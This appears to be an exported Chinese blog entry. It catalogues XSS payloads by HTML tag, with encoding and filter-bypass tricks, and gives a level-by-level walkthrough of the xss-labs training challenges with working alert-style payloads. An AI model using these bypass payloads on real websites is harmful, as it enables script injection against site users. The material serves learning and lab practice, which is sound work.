<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>XSS中常见标签利用以及XSS-labs通关攻略</title>
    <url>/2020/07/30/XSS%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%A0%87%E7%AD%BE%E5%88%A9%E7%94%A8%E4%BB%A5%E5%8F%8AXSS-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/</url>
    <content><![CDATA[<h1 id="0x00常见的标签利用"><a href="#0x00常见的标签利用" class="headerlink" title="0x00常见的标签利用"></a>0x00常见的标签利用</h1><a id="more"></a>
<h2 id="60-img-62-标签"><a href="#60-img-62-标签" class="headerlink" title="&#60;img&#62; 标签"></a>&#60;img&#62; 标签</h2><h3 id="XSS利用-1"><a href="#XSS利用-1" class="headerlink" title="XSS利用 1"></a>XSS利用 1</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src=javascript:alert(&apos;xss&apos;)&gt;   //版本，E7.0|IE6.0，才能执行 </span><br><span class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;  //版本，E7.0|IE6.0，才能执行 </span><br><span class="line">&lt;img src=&quot;URL&quot; style=&apos;Xss:expression(alert(/xss/));&apos;&gt;  //版本，E7.0|IE6.0，才能执行 </span><br><span class="line">CSS标记XSS</span><br><span class="line">&lt;img STYLE=&quot;background-image:url(javascript:alert(&apos;XSS&apos;))&quot;&gt;  //版本，E7.0|IE6.0，才能执行 </span><br><span class="line">CSS样式表的标记进行XSS转码</span><br><span class="line">&lt;img STYLE=&quot;background-image:\75\72\6c\28\6a\61\76\61\73\63\72\69\70\74\3a\61\6c\65\72\74\28\27\58\53\53\27\29\29&quot;&gt;   //版本，E7.0|IE6.0，才能执行</span><br></pre></td></tr></table></figure>

<h3 id="XSS利用2："><a href="#XSS利用2：" class="headerlink" title="XSS利用2："></a>XSS利用2：</h3><p>html编码: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt; //可以不加&quot;和; </span><br><span class="line">原code:</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt; </span><br><span class="line">16进制编码ASCII: &lt;img src=&quot;1&quot; onerror=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;&lt;/img&gt;  //必须要有双引号，不然执行不了 </span><br><span class="line">原code:</span><br><span class="line">&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&apos;xss&apos;)&quot;)&gt;&lt;/img&gt; //可以去掉双引号</span><br></pre></td></tr></table></figure>

<h3 id="XSS利用3："><a href="#XSS利用3：" class="headerlink" title="XSS利用3："></a>XSS利用3：</h3><p>错误事件: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt; </span><br><span class="line">鼠标在其上事件: &lt;img src=1 onmouseover=alert(&apos;xss&apos;) type=&quot;text&quot; &gt;</span><br></pre></td></tr></table></figure>

<h2 id="60-a-62-标签"><a href="#60-a-62-标签" class="headerlink" title="&#60;a&#62; 标签"></a>&#60;a&#62; 标签</h2><h3 id="标准格式："><a href="#标准格式：" class="headerlink" title="标准格式："></a>标准格式：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.baidu.com&quot;&gt;  baidu  &lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h3 id="XSS利用1："><a href="#XSS利用1：" class="headerlink" title="XSS利用1："></a>XSS利用1：</h3><p>编码后： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a   href=javascript:eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;2&lt;/a&gt;   //不能去掉双引号 </span><br><span class="line">&lt;a href=javascript:eval(&quot; &amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41; &quot;)&gt;2&lt;/a&gt;  //可以去掉双引号 </span><br><span class="line">原code：</span><br><span class="line">&lt;a href=javascript:eval(&quot;alert(&apos;xss&apos;)&quot;)&gt;2&lt;/a &gt;</span><br></pre></td></tr></table></figure>

<p> 编码后： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&quot;&gt;2&lt;/a&gt; </span><br><span class="line">&lt;a href=&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#47&amp;#120&amp;#115&amp;#115&amp;#47&amp;#41&gt;XSStest&lt;/a&gt; </span><br><span class="line">原code：</span><br><span class="line">&lt;a href=&quot;javascript:alert(&apos;xss&apos;)&quot;&gt;2&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h3 id="XSS-利用2："><a href="#XSS-利用2：" class="headerlink" title="XSS 利用2："></a>XSS 利用2：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&gt;test&lt;/a&gt; //base64编码，在谷歌浏览器可以成功解析 ：&lt;img src=x onerror=alert(1)&gt;  &lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;test&lt;/a&gt; </span><br><span class="line">// PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=            // &lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="XSS利用3：-1"><a href="#XSS利用3：-1" class="headerlink" title="XSS利用3："></a>XSS利用3：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&quot; onclick=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;aaaaa&lt;/a&gt;   //可以去掉双引号和； </span><br><span class="line">原code:</span><br><span class="line">&lt;a href=&quot;&quot; onclick=&quot;alert(1)&quot;&gt;aaaaa&lt;/a&gt; </span><br><span class="line">js以及html编码后： &lt;a href=&quot;&quot;onclick=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;aaaaa&lt;/a&gt; </span><br><span class="line">&lt;a href=&quot;&quot; onclick=eval(&apos;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&apos;)&gt;aaaaa&lt;/a&gt;   //单引号和双引号都可以 </span><br><span class="line">&lt;a href=&quot;&quot; onclick=eval(&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#120&amp;#115&amp;#115&amp;#39&amp;#41)&gt;aaaaa&lt;/a&gt;  //可以成功弹窗，如果在url地址栏输入的时候，要进行urlenode编码 </span><br><span class="line">原code：</span><br><span class="line">eval(&quot;alert(&apos;xss&apos;)&quot;)  &lt;a href=&quot;#&quot; onclick=alert(‘\170\163\163’)&gt;test3&lt;/a&gt;  //可以成功执行 </span><br><span class="line">原code：</span><br><span class="line">&lt;a href=&quot;#&quot; onclick=alert(&apos;xss&apos;)&gt;test3&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h3 id="XSS利用4："><a href="#XSS利用4：" class="headerlink" title="XSS利用4："></a>XSS利用4：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(123) y=2016&gt;2&lt;/a&gt;   //可以实现弹窗</span><br></pre></td></tr></table></figure>

<h2 id="60-input-62-标签"><a href="#60-input-62-标签" class="headerlink" title="&#60;input&#62; 标签"></a>&#60;input&#62; 标签</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一般格式：</span><br><span class="line">&lt;INPUT name=&quot;name&quot; value=&quot;&quot;&gt; </span><br><span class="line">事件弹窗: &lt;input value=&quot;&quot; onclick=&quot;alert(11)&quot; type=&quot;text&quot;&gt; </span><br><span class="line">&lt;INPUT name=&quot;name&quot; value=&quot;01/01/1967&quot; onmouseover=prompt(971874) bad=&quot;&quot;&gt; </span><br><span class="line">script弹窗: &lt;INPUT name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="小技巧："><a href="#小技巧：" class="headerlink" title="小技巧："></a>小技巧：</h2><h3 id="当XSS遇到input-hidden属性"><a href="#当XSS遇到input-hidden属性" class="headerlink" title="当XSS遇到input hidden属性"></a>当XSS遇到input hidden属性</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、使用expression突破</span><br><span class="line">&lt;input type=hidden style=`x:expression(alert(/xss/))`&gt; </span><br><span class="line">直接利用CSS的expression属性来实现突破，此技巧适用于IE6及以下的浏览器。</span><br><span class="line">2​、使用accesskey突破</span><br><span class="line">&lt;input type=&quot;hidden&quot; accesskey=&quot;X&quot; onclick=&quot;alert(/xss/)&quot;&gt; </span><br><span class="line">插入之后， 火狐 使用ALT+SHIFT+X快捷键来触发XSS， Chrome使用ALT+X触发 。</span><br><span class="line">类似这种span标签在网页无触发点，也可以这样子用。</span><br><span class="line">&lt;span id=&quot;span&quot;  recieveurl=&apos;xxxeId=1&apos; accesskey=&apos;X&apos; onclick=&apos;alert(/xss/)&apos; bad=&apos;&apos;&gt;&lt;/span&gt;</span><br></pre></td></tr></table></figure>

<h3 id="60-form-62-标签"><a href="#60-form-62-标签" class="headerlink" title="&#60;form&#62; 标签"></a>&#60;form&#62; 标签</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form method=Post action=kycg.asp?ttt=1000 onmouseover=prompt(962613) y=&amp;enddate=2016 &gt; #action后面直接空格 </span><br><span class="line">&lt;input type=&apos;text&apos; name=&apos;page&apos; value=0&gt; </span><br><span class="line">&lt;input name=&apos;submit&apos; type=&apos;submit&apos; value=&apos;GO&apos; class=&quot;input2&quot;&gt; </span><br><span class="line">&lt;/form&gt;  &lt;form method=Post action=javascript:alert(&apos;xss&apos;) &gt; </span><br><span class="line">&lt;input type=&apos;text&apos; name=&apos;page&apos; value=0&gt; </span><br><span class="line">&lt;input name=&apos;submit&apos; type=&apos;submit&apos; value=&apos;GO&apos; class=&quot;input2&quot;&gt; </span><br><span class="line">&lt;/form&gt;  &lt;form method=Post action=1 onmouseover=alert(123) bbb=111 &gt; </span><br><span class="line">&lt;input type=&apos;text&apos; name=&apos;page&apos; value=0&gt; </span><br><span class="line">&lt;input name=&apos;submit&apos; type=&apos;submit&apos; value=&apos;GO&apos; class=&quot;input2&quot;&gt; </span><br><span class="line">&lt;/form&gt;   </span><br><span class="line">&lt;form method=Post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; </span><br><span class="line">&lt;input type=&apos;text&apos; name=&apos;page&apos; value=0&gt; </span><br><span class="line">&lt;input name=&apos;submit&apos; type=&apos;submit&apos; value=&apos;GO&apos; class=&quot;input2&quot;&gt; </span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<h3 id="60-iframe-62-标签"><a href="#60-iframe-62-标签" class="headerlink" title="&#60;iframe&#62; 标签"></a>&#60;iframe&#62; 标签</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=javascript:alert(&apos;xss&apos;);height=0 width=0 /&gt;&lt;iframe&gt;  &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; </span><br><span class="line">&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;     //谷歌浏览器下实现弹窗  &lt;iframe src=1 onmouseover=alert(&apos;xss&apos;) y=2016 /&gt;&lt;iframe&gt;  &lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;;&quot; frameborder=&quot;0&quot; width=&quot;100%&quot; height=&quot;1120px&quot;&gt;&lt;/iframe&gt; //遇到的有点特别  &lt;iframe src=&quot;vbscript:msgbox(123)&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<h1 id="0x01-xss-labs-通关攻略"><a href="#0x01-xss-labs-通关攻略" class="headerlink" title="0x01 xss-labs 通关攻略"></a>0x01 xss-labs 通关攻略</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h2><p>最简单的反射型xss，直接给name传参 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h2><p>有一个搜索框，搜索框内的内容可以显示到页面上。直接搜索:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到并没有执行，但是会出现在页面上。<br>此时F12查看网站源代码，可以看到定位在：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>这里需要闭合”以及&#60;&#62;。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure>

<h2 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h2><p>一开始还是想用和第二关一样的方法，闭合掉前面是value，但是发现死活闭合不了。<br>去看了php源码，所有的地方都被htmlspecialchars函数过滤了，该函数可以过滤”&lt;””&gt;””” “，但是不会过滤单引号，而且value的闭合也是采用单引号，所以会有xss漏洞：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt; </span><br><span class="line">&lt;form action=level3.php method=GET&gt; </span><br><span class="line">&lt;input name=keyword  value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;</span><br></pre></td></tr></table></figure>

<p>所以考虑使用事件，并且闭合掉前面的’。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：&apos; onclick=&apos;alert(1)。</span><br></pre></td></tr></table></figure>

<h2 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h2><p>首先常规的输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>发现把&#60;&#62;接过滤掉了，尝试双写，依然被过滤掉。<br>只能使用事件进行注入，value的闭合使用的是单引号。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>

<h2 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h2><p>先常规的输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>发现变成了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;scr_ipt&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>尝试大写绕过，无果。<br>那么使用事件吧，输入：onclick =alert(1)，发现也变成了：o_nclick =alert(1)。<br>那么事件和script都用不了了。<br>使用跳转并没有被过滤。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;</span><br></pre></td></tr></table></figure>

<h2 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h2><p>和上题差不多，只不过把href也一起加了_。<br>不过没有过滤大小写，按前面几关的改大写的payload即可。</p>
<h2 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h2><p>这次是直接全部过滤掉了。大写后全部替换为小写。不过测试后发现只去掉一次，可以使用之前的双写payload。</p>
<h2 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h2><p>首先输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>找插入点，发现直接插在了一个href里面，那么直接输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure>

<p>但是发现被过滤了，变成了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascr_ipt:alert(1)&quot;&gt;友情链接&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<pre><code>看一下源码，发现很多都被过滤了：</code></pre><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]); </span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str); </span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2); </span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3); </span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4); </span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5); </span><br><span class="line">$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);</span><br></pre></td></tr></table></figure>

<p>解决办法是使用html实体编码 : </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)</span><br></pre></td></tr></table></figure>

<h2 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h2><p>这里发现怎么输入链接都是非法的，审计php源码可以看到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(false===strpos($str7,&apos;http://&apos;))</span><br></pre></td></tr></table></figure>

<p>其他的过滤都和上一关一样，所以提交的字符串必须要有http://。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(&apos;http://www.baidu.com&apos;)</span><br></pre></td></tr></table></figure>

<h2 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h2><p>经过测试，这里的keyword不再回显到页面上，阅读源码： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$str11 = $_GET[&quot;t_sort&quot;]; </span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11); </span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22); </span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt; </span><br><span class="line">&lt;form id=search&gt; </span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>t_sort才是可以xss的注入点。这一关也会过滤”&lt;”,可以用事件绕过:” onmouseover=”alert(1)”<br>        因为input是隐藏的，所以不会触发事件，需要通过其它方法触发，采用html的accesskey属性，不同的浏览器有不同的触发方式：<br>                (1)火狐是shift+ctrl+x（定义的）<br>                (2)Chrome alt+x<br>       加一个type=”text”来覆盖后面的hidden.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：t_sort=2&quot; accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure>

<h2 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h2><p>测试之后发现只有t_sort是真实接收数据的，回显在input表单内，type为hidden。还进行了html编码，无法闭合”。<br>看一下源码，发现接受处理的其实是referer参数，然后回显在t_ref上。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：Referer： &quot; type=&quot;text&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>

<h2 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h2><p>看到一个t_ua字段，看来是抓包修改user-agent字段。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：&quot; type=&quot;text&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>

<h2 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h2><p>有t_cook字段，抓包修改cookie字段。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：Cookie: user=call+me+maybe%3F&quot; type=&quot;text&quot; onclick=&quot;alert(1);</span><br></pre></td></tr></table></figure>

<h2 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a>level-14</h2><p> 这题的外链挂了，看了网上的payload好像是上传一个可以xss的图片。exif xss。</p>
<h2 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h2><p>打开题目发现有提示，nginclude，原来使用了angular.min.js。符合sop策略。<br>AngularJS：ng-include 指令用于包含外部的 HTML 文件。，包含的内容将作为指定元素的子节点。<br>ng-include 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。<br>需要单引号包裹，否则变成注释。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：?src=&apos;level1.php?name=test&lt;img src=1 onerror=alert(1)&gt;&apos;</span><br></pre></td></tr></table></figure>

<h2 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h2><p>过滤空格，script，/，可以使用%0d或者%0a做分割符进行绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：?keyword=&lt;img%0Dsrc=1%0Donerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<h2 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h2><p>输入点在url里面，输出点在embed标签内。<br>直接在embed标签插入onmouseover事件:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：?arg01=a&amp;arg02=b onmouseover=alert(1)</span><br></pre></td></tr></table></figure>

<h2 id="level-18"><a href="#level-18" class="headerlink" title="level-18"></a>level-18</h2><p>做法同上。</p>
<h2 id="level-19"><a href="#level-19" class="headerlink" title="level-19"></a>level-19</h2><p>这题测试之后发现根本找不到回显点，查了网上的写法，属于flash-xss。<br>下载jpex对swf文件进行逆向。首先定位到getURL函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                getURL(sIFR.instance.primaryLink,sIFR.instance.primaryLinkTarget); </span><br><span class="line">&#125;),new ContextMenuItem(&quot;Open link in new window&quot;,function() </span><br><span class="line">&#123; </span><br><span class="line">getURL(sIFR.instance.primaryLink,&quot;_blank&quot;); </span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>

<p>然后定位到sIFR.VERSION： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(_loc5_ &amp;&amp; _root.version != sIFR.VERSION) </span><br><span class="line">&#123; </span><br><span class="line">_loc4_ = sIFR.VERSION_WARNING.split(&quot;%s&quot;).join(_root.version); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得知version参数可以传入loc4变量中，即sIFR的内容中，但是getURL只在内容为link时打开，所以分析contentIsLink函数:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">        function contentIsLink() </span><br><span class="line">&#123; </span><br><span class="line">return this.content.indexOf(&quot;&lt;a &quot;) == 0 &amp;&amp; (this.content.indexOf(&quot;&lt;a &quot;) == this.content.lastIndexOf(&quot;&lt;a &quot;) &amp;&amp; this.content.indexOf(&quot;&lt;/a&gt;&quot;) == this.content.length - 4); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们可以构造<a> </a> 标签来传值:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p> 点击123即可成功。</p>
<h2 id="level-20"><a href="#level-20" class="headerlink" title="level-20"></a>level-20</h2><p>还是flash-xss。逆向出来的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package </span><br><span class="line">&#123; </span><br><span class="line">import flash.display.LoaderInfo; </span><br><span class="line">import flash.display.Sprite; </span><br><span class="line">import flash.display.StageScaleMode; </span><br><span class="line">import flash.events.Event; </span><br><span class="line">import flash.events.MouseEvent; </span><br><span class="line">import flash.external.ExternalInterface; </span><br><span class="line">import flash.system.Security; </span><br><span class="line">import flash.system.System; </span><br><span class="line"> </span><br><span class="line">public class ZeroClipboard extends Sprite </span><br><span class="line">&#123; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">private var button:Sprite; </span><br><span class="line"> </span><br><span class="line">private var id:String = &quot;&quot;; </span><br><span class="line"> </span><br><span class="line">private var clipText:String = &quot;&quot;; </span><br><span class="line"> </span><br><span class="line">public function ZeroClipboard() </span><br><span class="line">&#123; </span><br><span class="line">super(); </span><br><span class="line">stage.scaleMode = StageScaleMode.EXACT_FIT; </span><br><span class="line">Security.allowDomain(&quot;*&quot;); </span><br><span class="line">var flashvars:Object = LoaderInfo(this.root.loaderInfo).parameters; </span><br><span class="line">id = flashvars.id; </span><br><span class="line">button = new Sprite(); </span><br><span class="line">button.buttonMode = true; </span><br><span class="line">button.useHandCursor = true; </span><br><span class="line">button.graphics.beginFill(13434624); </span><br><span class="line">button.graphics.drawRect(0,0,Math.floor(flashvars.width),Math.floor(flashvars.height)); </span><br><span class="line">button.alpha = 0; </span><br><span class="line">addChild(button); </span><br><span class="line">button.addEventListener(MouseEvent.CLICK,clickHandler); </span><br><span class="line">button.addEventListener(MouseEvent.MOUSE_OVER,function(param1:Event):* </span><br><span class="line">&#123; </span><br><span class="line">ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOver&quot;,null); </span><br><span class="line">&#125;); </span><br><span class="line">button.addEventListener(MouseEvent.MOUSE_OUT,function(param1:Event):* </span><br><span class="line">&#123; </span><br><span class="line">ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOut&quot;,null); </span><br><span class="line">&#125;); </span><br><span class="line">button.addEventListener(MouseEvent.MOUSE_DOWN,function(param1:Event):* </span><br><span class="line">&#123; </span><br><span class="line">ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseDown&quot;,null); </span><br><span class="line">&#125;); </span><br><span class="line">button.addEventListener(MouseEvent.MOUSE_UP,function(param1:Event):* </span><br><span class="line">&#123; </span><br><span class="line">ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseUp&quot;,null); </span><br><span class="line">&#125;); </span><br><span class="line">ExternalInterface.addCallback(&quot;setHandCursor&quot;,setHandCursor); </span><br><span class="line">ExternalInterface.addCallback(&quot;setText&quot;,setText); </span><br><span class="line">ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;load&quot;,null); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">public function setHandCursor(param1:Boolean) : * </span><br><span class="line">&#123; </span><br><span class="line">button.useHandCursor = param1; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">private function clickHandler(param1:Event) : void </span><br><span class="line">&#123; </span><br><span class="line">System.setClipboard(clipText); </span><br><span class="line">ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;complete&quot;,clipText); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">public function setText(param1:*) : * </span><br><span class="line">&#123; </span><br><span class="line">clipText = param1; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上一关是getlURL，而这一关是ExternalInterface.call。首先通过LoaderInfo从URL中取值：<br>var flashvars:Object = LoaderInfo(this.root.loaderInfo).parameters;<br>id = flashvars.id;<br>接下来构造payload就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:arg01=id&amp;arg02=xss\&quot;))&#125;catch(e)&#123;alert(/xss/)&#125;//%26width=123%26height=123</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS学习笔记</title>
    <url>/2020/07/28/XSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
